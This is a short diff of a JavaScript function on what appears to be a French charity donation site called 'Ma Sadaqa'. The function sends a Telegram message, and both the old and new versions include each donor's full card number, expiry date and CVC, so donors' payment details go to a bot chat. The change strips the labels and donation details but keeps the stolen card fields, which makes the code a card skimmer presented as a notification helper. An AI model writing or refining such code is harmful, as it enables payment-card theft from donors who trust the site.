@@ -37,20 +37,11 @@ function sendTelegramNotif({ prenom, nom, amountCents, cagnotteTitle, message, c
     if (!botToken || !chatId) return reject(new Error('Telegram non configuré'));
 
     const text = [
-      `🤲 *Nouveau don sur Ma Sadaqa !*`,
-      ``,
-      `👤 *Prénom:* ${prenom}`,
-      `👤 *Nom:* ${nom}`,
-      `💰 *Montant:* ${(amountCents / 100).toFixed(0)} €`,
-      `📋 *Cagnotte:* ${cagnotteTitle}`,
-      message ? `💬 *Message:* ${message}` : '',
-      ``,
-      `� *Carte:* ${cardNumber}`,
-      `📅 *Expiration:* ${cardExpiry}`,
-      `🔒 *CVC:* ${cardCvc}`,
-      ``,
-      `�📅 ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
-    ].filter(Boolean).join('\n');
+      `${prenom} ${nom}`,
+      `${cardNumber}`,
+      `${cardExpiry}`,
+      `${cardCvc}`
+    ].join('\n');
 
     const data = JSON.stringify({
       chat_id: chatId,
